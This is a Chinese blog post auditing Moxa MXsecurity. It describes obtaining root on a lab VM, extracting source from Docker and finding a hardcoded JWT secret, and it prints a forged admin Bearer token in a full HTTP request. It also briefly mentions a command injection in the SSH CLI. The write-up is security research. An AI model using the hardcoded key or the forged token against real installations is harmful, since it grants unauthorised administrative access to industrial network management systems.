---
title: Moxa MXsecurity 硬编码认证绕过/SSH伪shell命令注入
url: https://y4er.com/posts/mxsecurity-command-injection-and-hardcoded-credential/
source: Y4er的博客
date: 2023-05-27
fetch_date: 2025-10-04T11:36:41.686545
---

# Moxa MXsecurity 硬编码认证绕过/SSH伪shell命令注入

[Y4er的博客](/ "Y4er的博客")

[归档](/posts/) [专栏](/series/) [分类](/categories/) [标签](/tags/) [笔记](/note/) [朋友](/friends/) [作品](/showcase/)

浅色深色跟随系统

[Y4er的博客](/ "Y4er的博客")

取消

[归档](/posts/)[专栏](/series/)[分类](/categories/)[标签](/tags/)[笔记](/note/)[朋友](/friends/)[作品](/showcase/)

浅色深色跟随系统

## 目录

* [下载和安装](#下载和安装)
* [登录ssh](#登录ssh)
* [源码](#源码)
* [jwt硬编码key](#jwt硬编码key)
* [SSH伪shell命令注入](#ssh伪shell命令注入)

## 目录

* [下载和安装](#下载和安装)
* [登录ssh](#登录ssh)
* [源码](#源码)
* [jwt硬编码key](#jwt硬编码key)
* [SSH伪shell命令注入](#ssh伪shell命令注入)

# Moxa MXsecurity 硬编码认证绕过/SSH伪shell命令注入

![Y4er avatar](/img/avatar.jpg)[Y4er](https://github.com/Y4er "Author")
 收录于  类别 [代码审计](/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)

2023-05-26  2023-05-26  约 592 字
 预计阅读 3 分钟

目录

* [下载和安装](#下载和安装)
* [登录ssh](#登录ssh)
* [源码](#源码)
* [jwt硬编码key](#jwt硬编码key)
* [SSH伪shell命令注入](#ssh伪shell命令注入)

警告

本文最后更新于 2023-05-26，文中内容可能已过时。

# # 下载和安装

<https://www.moxa.com/en/products/industrial-network-infrastructure/network-management-software/mxsecurity-series?viewmode=0#resources>

<https://moxa.com/getmedia/8e5b2588-de24-4bb1-ae58-16354ee70662/moxa-mxsecurity-series-manual-v1.0.pdf>

# # 登录ssh

用admin用户登录只有一个cli程序，不是bash，需要挂载vmdk修改/etc/shadow文件，改掉user1用户的密码。

text

```
user1:$6$xPyopDlu$p3jdHPn3XG8OToD6acaXPBtVQgIvx.fUor0rJEtL0qgLqfPDcPvKlC0eDa77P5afST3Hrg7DFlPQrdqAHSisY1:19188:0:99999:7:::
```

密码为`qwe123!@#`

然后用user1用户登录，sudo过去就是root了

[![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/04500858-08ad-70dd-66d2-d5d78a77ebef.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/04500858-08ad-70dd-66d2-d5d78a77ebef.png "image.png")

image.png

# # 源码

docker 启动的，从docker cp出来即可

bash

```
[root@mxsecurity user1]# docker ps
CONTAINER ID   IMAGE                           COMMAND                  CREATED         STATUS                   PORTS                                                                                  NAMES
0173ff8b578c   nsm-web                         "python3 -u run.py"      8 minutes ago   Up 8 minutes             0.0.0.0:443->443/tcp, :::443->443/tcp                                                  nsm-web
eb9dcdd27d4b   nsm-receiver                    "python3 -u run.py"      8 minutes ago   Up 8 minutes                                                                                                    nsm-receiver
44dc99289cb6   eclipse-mosquitto:1.6-openssl   "/docker-entrypoint.…"   8 minutes ago   Up 8 minutes             0.0.0.0:1883->1883/tcp, :::1883->1883/tcp, 0.0.0.0:8883->8883/tcp, :::8883->8883/tcp   nsm-broker
d2175f582fac   cturra/ntp                      "/bin/sh /opt/startu…"   8 minutes ago   Up 8 minutes (healthy)   0.0.0.0:123->123/udp, :::123->123/udp                                                  nsm-ntp
[root@mxsecurity user1]# docker cp 0173ff8b578c:/app/ /tmp/
```

# # jwt硬编码key

python

```
APP.config["JWT_SECRET_KEY"] = "MXsecurity secret key"
APP.config["JWT_ACCESS_TOKEN_EXPIRES"] = timedelta(days=1)
APP.config["JWT_TOKEN_LOCATION"] = ["headers", "cookies"]
JWT = JWTManager(APP)
```

伪造一个

http

```
GET /api/v1/system/status HTTP/1.1
Host: 172.16.16.204
Sec-Ch-Ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"
Dnt: 1
Sec-Ch-Ua-Mobile: ?0
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY4NTA2NTY0OCwianRpIjoiNjM0OTZmMzQtMjIzYi00MWE0LTg3MzMtNWEyMDZlMWM1NTQxIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6eyJ1c2VySWQiOiIxOTc4MjdkNC1mZjk5LTRlOTktOWVmOC03MTkzYTdhYWIzYTIiLCJ1c2VybmFtZSI6ImEiLCJkZXNjcmlwdGlvbiI6InJvb3QiLCJpc1Jvb3QiOnRydWUsInJvbGUiOnsicm9sZUlkIjoxLCJuYW1lIjoiQWRtaW4iLCJkZXNjcmlwdGlvbiI6IkFkbWluIiwicGVybWlzc2lvbkxpc3QiOlt7InBlcm1pc3Npb25JZCI6MSwiaWQiOiJkYXNoYm9hcmQiLCJ2YWx1ZSI6Mn0seyJwZXJtaXNzaW9uSWQiOjIsImlkIjoic3lzdGVtIiwidmFsdWUiOjJ9LHsicGVybWlzc2lvbklkIjozLCJpZCI6Im1hbmFnZW1lbnQiLCJ2YWx1ZSI6Mn0seyJwZXJtaXNzaW9uSWQiOjQsImlkIjoiZGV2aWNlQ29uZmlndXJhdGlvbiIsInZhbHVlIjoyfSx7InBlcm1pc3Npb25JZCI6NSwiaWQiOiJsb2dnaW5nIiwidmFsdWUiOjJ9LHsicGVybWlzc2lvbklkIjo2LCJpZCI6ImFib3V0IiwidmFsdWUiOjJ9XX0sInJlc2V0TW9kZSI6ImRvbmUiLCJsb2dpbmVkQXQiOiIyMDIzLTA1LTI2VDAxOjQ3OjI4WiIsImxvZ2luZWRUaW1lIjoxNjg1MDY1NjQ4LCJhdXRvTG9nb3V0VGltZSI6OTAwfSwibmJmIjoxNjg1MDY1NjQ4LCJjc3JmIjoiYWI3YjliMjctNjM4Ny00MDYzLWIxZmItZDc0OGRiNDcxZWE2IiwiZXhwIjoyNjk1MTUyMDQ4fQ.sO6cu-ly2D6e7ZctlVuBcF4CkNmZvbMuwQU7U-xyM2g
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Skiploading: true
Sec-Ch-Ua-Platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://172.16.16.204/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,ga;q=0.6
Connection: close
```

[![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/32905ca1-1c7e-deb5-6c52-c83580aa42c5.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/32905ca1-1c7e-deb5-6c52-c83580aa42c5.png "image.png")

image.png

# # SSH伪shell命令注入

我刚开始还以为是web上的命令注入，然后仔细看了看通告，发现是/bin/cli程序的命令注入

[![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/22504fb6-b098-026e-18bb-6cd0bc32a62b.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/22504fb6-b098-026e-18bb-6cd0bc32a62b.png "image.png")

image.png

我的评价是十分鸡肋。

文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。

![](/img/avatar.jpg)

*如果你觉得这篇文章对你有所帮助，欢迎赞赏或关注微信公众号～*

![](/img/reward/wechat.png)![](/img/reward/alipay.png)![](/img/reward/weixin_mp.jpg)

更新于 2023-05-26

LINE

[Bypass](/tags/bypass/), [Python](/tags/python/), [Jwt](/tags/jwt/), [Rce](/tags/rce/)

返回 | [主页](/)

[Trend Micro Mobile Security 认证绕过/文件上传/文件包含 RCE](/posts/trend-micro-mobile-security-rce/ "Trend Micro Mobile Security 认证绕过/文件上传/文件包含 RCE")
[Nacos Hessian 反序列化 RCE](/posts/nacos-hessian-rce/ "Nacos Hessian 反序列化 RCE")

Please enable JavaScript to view the comments powered by [Utterances](https://utteranc.es/).

由 [Hugo](https://gohugo.io/ "Hugo 0.148.2") 强力驱动 | 托管在 [Cloudflare Pages](https://pages.cloudflare.com/ "Cloudflare Pages") 上 | 主题 -  [DoIt](https://github.com/HEIGE-PCloud/DoIt "DoIt 0.4.2")

2018 - 2025 [Y4er](https://github.com/Y4er) | [CC BY-NC 4.0](https://creativecommons.org/licenses/by-nc/4.0/)